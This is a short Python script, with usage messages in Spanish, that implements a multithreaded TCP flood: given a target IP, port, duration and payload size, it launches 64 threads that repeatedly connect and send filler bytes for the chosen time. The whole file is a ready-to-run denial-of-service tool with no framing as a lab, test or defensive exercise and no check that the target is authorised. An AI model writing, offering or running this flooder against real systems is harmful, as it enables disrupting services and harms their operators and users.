import socket
import threading
import time
import sys

def tcp_flood(ip, port, duration=60, threads=64, payload_size=1024):
    end_time = time.time() + duration
    payload = b'A' * payload_size

    def sender():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                while time.time() < end_time:
                    try:
                        s.sendall(payload)
                    except Exception:
                        break
                s.close()
            except Exception:
                pass

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=sender)
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Uso: python {sys.argv[0]} <ip_destino> <puerto> [duracion_segundos] [tamano_payload_bytes]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    payload_size = int(sys.argv[4]) if len(sys.argv) > 4 else 1024

    print(f"[>] Enviando tráfico TCP a {ip}:{port} durante {duration}s, 64 hilos, payload={payload_size} bytes")
    tcp_flood(ip, port, duration, 64, payload_size)
    print("[*] Finalizado.")
